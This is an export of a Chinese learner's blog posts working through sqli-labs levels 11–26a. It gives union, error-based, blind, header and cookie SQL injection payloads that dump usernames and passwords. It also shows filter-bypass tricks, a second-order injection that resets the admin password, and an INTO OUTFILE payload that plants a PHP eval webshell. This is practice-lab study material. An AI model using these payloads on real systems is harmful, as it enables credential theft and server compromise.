$_GET[&#x27;subject&#x27;] . &quot; @ &quot; . $_GET[&#x27;web&#x27;];?&gt; &lt;/body&gt;&lt;/html&gt; 附上学习链接:PHP 超级全局变量 | 菜鸟教程 (runoob.com) 补充: get 和 post get 是从服务器上获取数据，post 是向服务器传送数据。 get 是把参数数据队列加到提交表单的 ACTION 属性所指的 URL 中，值和表单内各个字段一一对应，在 URL 中可以看到。post 是通过 HTTP post 机制，将表单内各个字段与其内容放置在 HTML HEADER 内一起传送到 ACTION 属性所指的 URL 地址。用户看不到这个过程。 对于 get 方式，服务器端用 Request.QueryString 获取变量的值，对于 post 方式，服务器端用 Request.Form 获取提交的数据。 get 传送的数据量较小，不能大于 2KB。post 传送的数据量较大，一般被默认为不受限制。但理论上，IIS4 中最大量为 80KB，IIS5 中为 100KB。 get 安全性非常低，post 安全性较高。","categories":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/categories/php%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://dr4x3zz.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"关于and 1=1和and 1=2学习记录","slug":"关于and-1-1和and-1-2学习记录","date":"2023-01-10T13:06:28.000Z","updated":"2024-11-08T09:57:42.897Z","comments":true,"path":"2023/01/10/关于and-1-1和and-1-2学习记录/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/10/%E5%85%B3%E4%BA%8Eand-1-1%E5%92%8Cand-1-2%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"# 关于 and 1=1 和 and 1=2 学习记录","text":"# 关于 and 1=1 和 and 1=2 学习记录 在 23 关时，我又重新对于这个 and 1=1 和 and 1=2 以及在注入时用一个错误的 id 后面的 union select 才能回显产生了很多疑问，这个博客是记录一下询问后的学习记录 # 问题 问题如下： 为什么 1=1 时候后面的注入语句不会执行，1=2 就执行了或者说我用错误的 id 也能执行，正确的 id 就不执行 其实不能说是不执行而是 sql 语句中的 limit 导致 union select 没办法查出回显点 # 解答 解答如下： 首先用 1 去查，在数据库里面变成查 id=1 的数据，很明显，数据库肯定是有这个数据 但是如果你 id=100，数据库没有存那么多数据，那么就会回显后面的 union select 1,2,3 这里的 - 1 同理，因为数据库没有这个 id=-1 的数据 然后是这个 and， 1’ and 1=2 此时这个结果为 false，在数据库里面是查不出来数据的，所以就会回显后面的 union select 1,2,3 但是如果是 1 ’ and 1=1 这个结果是 true，那么就会回显前面的结果 看最后这个，同时存在两行数据，由于注入语句带入进去后，末尾有一个 limit 0,1，那么他只会回显第一行数据 解决问题成功！","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-23-26a","slug":"sqli-labs-23-26a","date":"2023-01-10T06:19:13.000Z","updated":"2024-11-08T10:09:59.770Z","comments":true,"path":"2023/01/10/sqli-labs-23-26a/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/10/sqli-labs-23-26a/","excerpt":"# sqli-labs-23-26a","text":"# sqli-labs-23-26a # sqli-labs-23 在查看源代码时遇到一个函数记录一下先 preg_replace () 函数 语法 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。 参数说明： $pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是 - 1（无限制）。 $count: 可选，为替换执行的次数。 返回值 如果 subject 是一个数组， preg_replace () 返回一个数组， 其他情况下返回一个字符串。 如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。 简而言之， preg_replace (要替换的东西，替换成啥东西，哪个里面的东西需要替换); 回归正题， 先输入正确的 id 1url?id=1 页面显示正常，加上单引号尝试一下 页面报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 本题为单引号闭合，添加注释符 123url?id=1 --+url?id=1 #url?id=1 -- s 都不能起到注释作用，页面仍然显示报错 查看源代码 将参数 #和–替换成无 导致我们的注释符失效 所以要考虑绕过注释符了 这里补充一个知识点吧，and 1=1 代表永恒为真， and 1=2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点！and 1=1 和 and1=2 得到的结果是不一致，说明我们的语句可以被注入使用，也即存在注入点 用 order by 尝试判断字段数，我试了几次页面都是报错 order by 后面加数字，加字段名都是可以的，但是字段名是不可以带引号的，意思是让这个列排序，但是因为单引号闭合后里面的数字变成字符串了这就产生了语法错误。 所以这里直接用 union select 来判断字段数和回显点 123?id=1&#x27; and 1=2 union select 1&#x27; ?id=1&#x27; and 1=2 union select 1,2&#x27;?id=1&#x27; and 1=2 union select 1,2,3&#x27; 1 和 1,2 都报错，3 正常并且回显点 2，3 所以获取当前数据库 1?id=1&#x27; and 1=2 union select 1,2,(select database())&#x27; 12345678910//获取服务器所有数据库名称url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(schema_name) from information_schema.schemata)&#x27; //获取当前数据库的所有表名url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)&#x27; //获取users表中的所有列名url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)&#x27; //获取users表中所有username和passwordurl?id=1&#x27; and 1=2 union select 1,2,(select group_concat(username,&#x27;^&#x27;,password) from users)&#x27; //我这里还有别的靶场，也可以查询别的靶场的数据，由第一个查询所有数据库名称，我可以知道我还有dvwa数据库，获取dvwa所有表名url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)&#x27; 可以看到由两个表，一个是 guestbook，另一个是 users 12//获取dvwa中users的所有列名url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;)&#x27; 可以看到列名为 avatar,failed_login,first_name,last_login,last_name,password,user,user_id 12//获取user和password的所有数据url?id=1&#x27; and 1=2 union select 1,2,(select group_concat(user,&#x27;^&#x27;,password) from dvwa.users)&#x27; 查询结果就不放出来了，强调一点查询其他数据库的表中的内容要在表名前加上数据库名称，就那这个来说吧，我本意是查询 dvwa 的 pass 和 password，但是如果在 users 前不加上 dvwa，他就会查询当前数据库，但是当前数据库没有列名为 user 的数据，页面就会报错 ok，23 关就到这里 # sqli-labs-24 24 关已进入界面，和从前做过的大不一样，学习的内容是二次注入 SQL 注入一般分为两类：一阶 SQL 注入（普通 SQL 注入），二阶 SQL 注入 什么是二阶注入： 1. 构造带有注入语句的危险 payload1 数据，在 http 请求中提交到服务器当中，该数据会被服务器存储到数据库当中 2. 当我们要修改该 payload1 数据的时候，程序在检索存储 payload1 的数据库的时候将会造成 SQL 注入，如果攻击成功，在第二次响应中返回结果 3. 也称为存储型注入，将可能造成 sql 注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生 SQL 注入。 有一个忘记密码和新用户注册 点击忘记密码 让人哭笑不得啊 用正确的 username 和 pass 下面由三个位置，当前密码、新密码、重新输入密码 mysqli_real_escape_string () 函数 mysqli_real_escape_string () 函数转义在 SQL 语句中使用的字符串中的特殊字符。 1mysqli_real_escape_string(connection,escapestring); 参数 描述 connection 必需。规定要使用的 MySQL 连接。 escapestring 必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\\n、\\r、\\、’、&quot; 和 Control-Z。 可使用本函数来预防数据库攻击。 下列字符受影响： \\x00 \\n \\r \\ ’ &quot; \\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 *mysql_real_escape_string ()* 函数转义 SQL 语句中使用的字符串中的特殊字符，这里 select 语句中用户名和密码都有单引号闭合，用户输入用这个函数处理之后无法闭合单引号，因此无注入点。 无注入点具体原因和例子可以看：https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp insert() sql insert 语句的写法：1、“insert into 表名 values (值 1, 值 2…);”，将指定的数据插入到现成的表中；2、“Insert into 表名 1 select * from 表名 2;”，将另外表中数据查出来并插入到现成的表中。 由于函数 mysqli_real_escape_string ()，所以在登录和注册都没有注入点，在查看修改密码的源代码 还是找不到注入点，但是往下一看 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 这里就存在注入点，$username 就是一个很明显的注入点，但是我持有一个 username 肯定是无法修改这个 username，所以我需要注册一个 username，在注册时就让 username 携带一些注释符，就可以修改特定用户的密码了 这里尝试修改一下 admin 的密码，我先用 Navicat Premium 15 查看了一下数据库中 users 表中的用户数据 注册 Desired Username: admin’# Password: 123 **Retype Password:**123 Register！ 查看 users 表 多了一个 admin‘# 123 登录新注册的账号 将 admin’# 的密码改为 qwe update password 页面显示 Password successfully updated 再次查看 users 表 发现 admin’# 的密码没有改变，admin 的密码变成了 qwe 大功告成！ 原理 这就是二次注入，它的原理是： （1）后端（PHP）代码对语句进行了转义 （2）保存进数据库（mysql）时没有转义，是原语句 简而言之就是数据库对自己存储的数据非常放心，而用户恰恰向数据库插入了恶意语句。 解析 比如前面所注册的 admin ‘# 账号，在注册时，后端对其进行了转义（ addslashes () 或者 mysql_real_escape_string 和 mysql_escape_string 等），’# 被转义成了其他的东西，所以一次注入无效。 但是在保存进数据库的时候，还是 admin '#。 那么修改密码时的语句如下： 1update users set password=&#x27;123&#x27; where username=&#x27;admin &#x27;#&#x27; 所以你以为修改的是 admin '# 的账号，但是数据库理解成要修改密码的账号是 admin。 防范 至于如何防范二次注入也很简单： 一碗水端平，后端进行了转义，数据库也同样进行转义。 原理、解析、防范原文链接：https://blog.csdn.net/weixin_45663905/article/details/107684251 # sqli-labs-25 最下面的那行英文意思是 提示：您的输入将被过滤，结果如下： 图片中说 您所有的 “OR” 和 “AND” 都属于我们 说明本关过滤了 or 和 and，此时我们需要双写 or 和 and 另外，过滤的不仅仅是单词 or 和 and 还有含这个两个的单词 比如说 order 和 information 之类的 1url?id=1&#x27; 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 说明本关是单引号闭合 所以，先猜字段数 1?id=1&#x27; oorrder by 3--+ 直到 4 时页面报错说明时三个字段 联合注入查看回显 1?id=1&#x27; aandnd 1=2 union select 1,2,3--+ 2，3 回显 接下来可以直接爆数据了 12345678910//获取服务器上所有数据库名称url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(schema_name) from infoorrmation_schema.schemata)--+//获取当前数据库url?id=1&#x27; aandnd 1=2 union select 1,2,(select database())--+//获取security数据库中所有表名url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;)--+//获取users表中所有列名url?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;security&#x27; aandnd table_name=&#x27;users&#x27;)--+//获取users表中所有username和password?id=1&#x27; aandnd 1=2 union select 1,2,(select group_concat(username,&#x27;^&#x27;,passwoorrd) from users)--+ 写入 webshell 1url?id=1&#x27; aandnd 1=2 union select 1,2,&#x27;&lt;?php @eval($_POST[less25]);?&gt;&#x27; into outfile &#x27;D:/phpstudy/www/less25.php&#x27;--+ # sqli-labs-25a 我这里 25a 的源代码没了，导致我 25a 关卡没法做 又去 php7 靶场下载的地方看了一下 https://github.com/skyblueee/sqli-labs-php7 他没有 25a 这边就只能看一下别人写 25a 关卡的经验和方法了 我看了一下标题，还是过滤 or 和 and，应该是大差不差，差距就是 25 关时单引号闭合 25a 他标题写了整型 看了一下别人做 25a 题的方法，没有闭合符号直接就可以开始注入了 12url?id=1--+url?id=1 union select 1,2,3 --+ 其他的 payload 就不写出来了，我也没有自己做一边，尴尬。。。 # sqli-labs-26 从图片上就可以看到，他说你所有的空格和注释都会被过滤 除此之外，and 和 or 也都被过滤了 单引号闭合 这时候我们可以使用报错注入来避开空格的过滤 查询当前数据库 1url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(database()),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1 AND 运算符组合 N 个条件。对于 SQL 语句执行的操作 (无论是事务还是查询)，所有由 AND 分隔的条件都必须为 TRUE。 对于被过滤的字符，可以使用其他的字符进行替代，使用 “% a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。（在本关中我是用 % a0 和 %0b 都没办法代替空格，很纳闷） 27 关回来记录：我是用 % a0 没有用，%0a 才能转译为空格 payload 如下： 12345678//获取security数据库中所有表名url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1//获取users表中所有列名url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;security&#x27;)%26%26(table_name=&#x27;users&#x27;)),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1//获取users表中的所有username和passwordurl?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),1,31),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),32,63),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1url?id=1&#x27;aandnd(updatexml(1,concat(0x7e,substr((select(group_concat(username,&#x27;^&#x27;,passwoorrd))from(users)),64,95),0x7e),3))aandnd&#x27;1&#x27;=&#x27;1 由于 limit 0,1 没法注释掉，所以这关应该也没法写 webshell。 在学习本关时看到有一个博客是说无法直接从 users 表中拿数据，我已经拿到了，但是还是记录一下绕过的方法 方法如下：学习网址 sqli-labs 通关指南：Less 26 - 乌漆 WhiteMoon - 博客园 (cnblogs.com) 获取目标信息 这里我们无法直接从 users 表拿数据，我们可以先用一个表暂存从 users 表中取出所有数据的查询，然后再从这个暂存的表中取出数据。构造出的 payload 如下，思路就是利用一个查询从另一个查询中取出数据，以此绕过表的限制。注意到 “password” 要使用双写绕过，使用括号来代替空格的划分作用。 1?id=-1&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) )) ,1) || &#x27;1&#x27;=&#x27;1 # sqli-labs-26a 从界面就可以看到本关过滤了空格和注释 查看源代码 注入正常的参数，网页返回对应 id 的正常信息，注入两个单引号分别闭合前后的引号。 1url?id=1&#x27;&#x27; 网页回显正常的内容，说明该网页存在单引号闭合的字符型注入。 再测试是否有括号 1url?id=1&#x27;) 此时页面无回显信息 尝试闭合括号 1url?id=1&#x27;)aandnd(&#x27;1 此时页面显示正常，说明有使用单层括号来闭合 由于本关不报错，所以我们只能使用盲注了 再学习中看到本关能使用 union 注入，来尝试一下 1url?id=1&#x27;)%a0OorRDER%a0BY%a03||(&#x27;1 更改后面的值 1，2，3，4 页面都没有什么变化 尝试用 union select 来判断字段数 1url?id=9999&#x27;)%a0UNION%a0SELECT%a01,database(),3%a0||(&#x27;1 页面还是空白 使用同样的代码却达不到同样的效果，我也不能明白什么情况 附上学习链接：sqli-labs 通关指南：Less 26 - 乌漆 WhiteMoon - 博客园 (cnblogs.com) 我尝试 union 注入失败了，还是老老实实的盲注吧 本关的题目就写了基于盲注，还是使用盲注吧 获取当前数据库名称 1url?id=1&#x27;)aandnd(left((select(database())),8)=&#x27;security&#x27;)aandnd(&#x27;1 其他的 payload 就不一一列出了","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-21-22","slug":"sqli-labs-21-22","date":"2023-01-09T03:41:39.000Z","updated":"2024-11-08T10:09:53.277Z","comments":true,"path":"2023/01/09/sqli-labs-21-22/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/09/sqli-labs-21-22/","excerpt":"# sqli-labs-21-22","text":"# sqli-labs-21-22 # sqli-labs-21 用 bp 抓包，输入正确的账号密码后 通过 HTTP history 能看到抓到了两个报文一个是 get 型一个是 post 型，get 型 post 型用于传输账号密码，get 型用于获取 cookie 我们在查看报文的时候发现 cookie 被加密了 我们可以用 bp 的 Decoder 模块来转译 先 decoder as url，再 decoder as base64 查看源代码能找到 cookie 是由 base64 加密 接下来我们把 admin’放入 decoder 中，转译为 base64，encode as base64 转译为：YWRtaW4n 用 bp 的 repeater 来尝试，就不用输入一次 sql 语句抓一次包了 显而易见本题是单引号和括号的闭合 所以我们 sql 注入语句的闭合应该为 1admin&#x27;) and sql语句 # 输入语句要转译为 base64 获取当前数据库 1Cookie: uname=admin&#x27;) and updatexml(1,concat(0x7e,(select database()),0x7e),3) # 但我们不能直接输入注入语句 用 decoder，encode as base64 即 1Cookie: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwzKSAj 得到当前数据库为 security 其他 payload 就不一一列举了，按照格式转为 base64 后直接放入 uname = 后就可以了 注入点在 cookie 的 uname 参数值，payload 需要 base64 编码，如果编码后有等号还需要 url 编码 # sqli-labs-22 和 21 关一样输入 uname 和 passwd 后抓包 也是一个 get 型一个 post 型 找到 cookie 也是通过 base64 加密，decoder 转译 得到的 Cookie 和 21 关是一样的 uname 后面也是为 admin base64 加密转译 admin’ 用 repeater 尝试 发现页面错误但是没有报错 更换为双引号试试 这时候页面有报错 显而易见本题为双引号闭合 获取当前数据库 payload 1Cookie: uname=admin&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),3) # 转译为 base64 1Cookie: uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDMpICM= 具体的 payload 就不一一列出了 编码有等号还是能使用的，但是我在学习的时候有的是说编码中有等号还需要转为 url 编码，目前我使用还是没有发现含等于号不能使用的情况 查询了一下是说 Url 出现了有 +，空格，/，?，%，#，&amp;，= 等特殊符号的时候，可能在服务器端无法获得正确的参数值，抑或是造成不能正常下载文件 (作为 Download Url 时候)，就是需要将这些字符转化成服务器可以识别的字符；但是为何 Url 中有这些字符就会出现问题呢？这就得涉及到 URL 编码与解码问题了。 一般来说，URL 只能使用英文字母、阿拉伯数字和某些标点符号，不能使用其他文字和符号。 只有字母和数字 [0-9a-zA-Z]、一些特殊符号”$-_.+!*’(),”[不包括双引号]、以及某些保留字，才可以不经过编码直接用于 URL。 如果 URL 中有汉字，等特殊字符的时候，就必须编码后使用。而 +，空格，/，?，%，#，&amp;，=，这些字符 (不安全)，当把他们直接放在 Url 中的时候，可能会引起解析程序的歧义，因此也必须经过编码才能使用。","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-17-20","slug":"sqli-labs-17-20","date":"2023-01-07T05:21:15.000Z","updated":"2024-11-08T10:09:44.917Z","comments":true,"path":"2023/01/07/sqli-labs-17-20/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/07/sqli-labs-17-20/","excerpt":"# sqli-labs-17-20","text":"# sqli-labs-17-20 # sqli-labs-17 post data 在 uname 尝试单引号、双引号亦或是加上括号都没有什么作用 我们选择查看代码，打开 index.php 文件可以看到 uname 是被加上了 check_input () 函数去进行过滤，具体可以自行查看函数 我们从这里也可以看到 uname 被加密了但是 passwd 没有加密函数，所以我们可以选择从 passwd 注入 1uname=admin&amp;passwd=admin&#x27;&amp;submit=Submit post data 后发现页面报错 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘admin’’ at line 1 说明本题是单引号闭合 直接使用报错注入 12//获取当前数据库名称uname=admin&amp;passwd=admin&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),3)#&amp;submit=Submit 页面显示 XPATH syntax error: ‘security’ 显而易见当前数据库为 security 剩下的就不一一列举出来了 在访问 users 表获取 username 和 password 时 1uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3)#&amp;submit=Submit 无法访问到 users 刚开始还以为是我 payload 错误 反复检查没有找到错误 查看源代码之后发现 本关不是 select 而是 update 1UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值 查询之后发现本关需要绕过 1uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from (select username from users)a),1,31),0x7e),3)#&amp;submit=Submit 解释一下本关所需要绕过的语句：先查询括号里 select username from users，将这里面查询出来的数据作为一个结果集取名为 a，再 select * from a 查询 a , 将 结果集 a 全部查询出来 # sqli-labs-18 在 username 和 password 折腾半天没有什么结果 输入正确的 username 和 password 后发现页面显示 User-Agent 查看 index.php 文件后发现注入点在 user-agent 这里一直想不明白，假设我不知道正确的 username 和 password，我该如何去过这一关 后面问助班，他给我提了一个情景就明白了 假设我是某个网站的普通用户，持有我自己的账号密码，我可以通过 sql 注入去获取更高权限的账号密码 通过普通用户的账号密码来获取 root 用户的账号密码，获取更高的权限 好了，回归正题 查看 index.php 文件 发现这两个语句 我们知道页面登录成功后会显示 user-agent，所以从这里注入 insert=&quot;INSERTINTO‘security‘.‘uagents‘(‘uagent‘,‘ipaddress‘,‘username‘)VALUES(′insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;insert=&quot;INSERTINTO‘security‘.‘uagents‘(‘uagent‘,‘ipa​ddress‘,‘username‘)VALUES(′uagent’, ‘$IP’, $uname)&quot;; 这里我们需要闭合这一语句 所以我们输入的 sql 语句格式应该为 11&#x27;,1,sql语句) # 这里使用 bp 抓包，也可以使用 hackbar 另外，bp 抓不到 127.0.0.1 的网站了，所以可以查询一下 ip 地址，然后把 127.0.0.1 改为 ip 地址就可以抓包了 也可以勾选 hackbar 的 post data 和 User Agent，在 post data 里输入正确的用户名和密码 后续的爆库就不一一列举了就把 database () 改掉就好了，其他就不需要改动了，但是要注意 sql 语句的闭合，可以把上面指出来 index.php 文件中的注入点的 $uagent 和代码替换，检查一下是否闭合 # sqli-labs-19 正确登录后可以看到页面显示 Your Referer is: 查看代码闭合 所以本题 sql 语句闭合为 11&#x27;,sql语句)# bp 抓包在 referer 中输入正确闭合的 sql 语句 11&#x27;,updatexml(1,concat(0x7e,(select database()),0x7e),3)) # 页面显示 后续 payload 就不一一列举了，更改 sql 语句就好了，注意闭合 # sqli-labs-20 查看代码发现本关的注入点是 cookie (从本关的题目也可以知道) 用 bp 抓包 发现并没有 cookie, 输入正确的 uname 和 passwd 后 forword 发现还有一个是含有 cookie 的需要有正确的 uname 才会有 cookie 用 bp 的 repeater 在 cookie 后添加单引号 如下: 1Cookie: uname=admin&#x27; 可以看到本题是单引号闭合 猜字段数 尝试联合注入但是并不能得到回显字段，所以选择使用报错注入 后续 payload 就不一一列举了","categories":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/categories/sqli-labs/"}],"tags":[{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://dr4x3zz.github.io/tags/sqli-labs/"}]},{"title":"sqli-labs-11-16","slug":"sqli-labs-11-16","date":"2023-01-07T03:22:52.000Z","updated":"2023-01-07T05:19:12.000Z","comments":true,"path":"2023/01/07/sqli-labs-11-16/","link":"","permalink":"https://dr4x3zz.github.io/2023/01/07/sqli-labs-11-16/","excerpt":"# sqli-labs-11-16","text":"# sqli-labs-11-16 # sqli-labs-11 前 10 关都是 GET 型，第 11 关是为 POST 型 我们可以用 hackbar 也可以使用 burpsuite 来进行注入 我直接使用 hackbar 来进行注入 勾选上 post data 在框里输入注入语句 1uname=1&#x27;&amp;passwd=&amp;submit=Submit 有回显 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’ and password=’’ LIMIT 0,1’ at line 1 可以知道这是单引号闭合 我们在 uname=1’后面添加一个 #（注释掉后面的单引号），此时页面正常 先用 order by 判断字段数 1uname=1&#x27; order by 1#&amp;passwd=&amp;submit=Submit 直到 order by 3 页面出现 Unknown column ‘3’ in ‘order clause’ 说明只有两个字段 接下来用联合注入判断回显点 1uname=1&#x27; union select 1,2 #&amp;passwd=&amp;submit=Submit 页面显示 Your Login name:1 Your Password:2 说明两个字段都会回显 这时候就可以开始爆库了 payload 如下： 12345678910//获取服务器所有数据库名称uname=1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata) #&amp;passwd=&amp;submit=Submit//获取当前数据库名称uname=1&#x27; union select 1,(select database()) #&amp;passwd=&amp;submit=Submit//获取security数据库内所有表名uname=1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) #&amp;passwd=&amp;submit=Submit//获取users表中的所有字段名uname=1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;) #&amp;passwd=&amp;submit=Submit//获取所有username和passworduname=1&#x27; union select 1,(select group_concat(username,&#x27;^&#x27;,password) from users) #&amp;passwd=&amp;submit=Submit # sqli-labs-12 在 post data 输入 1uname=1&#x27;&amp;passwd=&amp;submit=Submit 页面显示正常，查看源码才知道他把’也包含进去了，并不是不回显 将’改为 &quot; 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;”) and password=(&quot;&quot;) LIMIT 0,1’ at line 1 说明本题为 &quot;）闭合 1uname=1&quot;) #&amp;passwd=&amp;submit=Submit 此时页面显示正常 开始正常的猜字段数，爆库等一系列操作 order by 3 才报错，说明两个字段 联合注入判断回显点 1uname=1&quot;) union select 1,2 #&amp;passwd=&amp;submit=Submit 两点都回显 随后 payload 和第十一关一样，把第十一关的单引号改为 &quot;) 就行了 # sqli-labs-13 post data 1uname=1&#x27;&amp;passwd=&amp;submit=Submit 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘1’’) and password=(’’) LIMIT 0,1’ at line 1 说明本题是’) 闭合 1uname=1&#x27;) #&amp;passwd=&amp;submit=Submit 此时页面正常，order by 猜字段数 联合注入判断回显点 1uname=1&#x27;) union select 1,2#&amp;passwd=&amp;submit=Submit 此时页面显示正常，但无回显点，这时候就要使用报错注入 payload 如下： 123456789101112131415//获取当前数据库名称uname=1&#x27;) and updatexml(1,concat(0x7e,(select database()),0x7e),3)#&amp;passwd=&amp;submit=Submit//获取服务器数据库名称uname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),3)#&amp;passwd=&amp;submit=Submituname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,63),0x7e),3)#&amp;passwd=&amp;submit=Submituname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),64,95),0x7e),3)#&amp;passwd=&amp;submit=Submit//获取当前数据库security的所有表名uname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,31),0x7e),3)#&amp;passwd=&amp;submit=Submit//获取users表内所有字段名uname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),1,31),0x7e),3)#&amp;passwd=&amp;submit=Submit//获取所有username和passworduname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(username,&#x27;^&#x27;,password) from users),1,31),0x7e),3)#&amp;passwd=&amp;submit=Submituname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(username,&#x27;^&#x27;,password) from users),32,63),0x7e),3)#&amp;passwd=&amp;submit=Submituname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(username,&#x27;^&#x27;,password) from users),64,95),0x7e),3)#&amp;passwd=&amp;submit=Submituname=1&#x27;) and updatexml(1,concat(0x7e,substr((select group_concat(username,&#x27;^&#x27;,password) from users),95,126),0x7e),3)#&amp;passwd=&amp;submit=Submit # sqli-labs-14 post data 1uname=1&#x27;&amp;passwd=&amp;submit=Submit 页面不报错 单引号改为双引号 页面显示 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1&quot;” and password=&quot;&quot; LIMIT 0,1’ at line 1 说明是双引号闭合 1uname=1&quot;#&amp;passwd=&amp;submit=Submit 此时页面正常 判断字段数 order by 3 报错说明两个字段 union select 1,2 不回显 报错注入 payload 和 13 关没有什么区别，把 13 关的’) 改为 &quot; 即可 # sqli-labs-15 post data 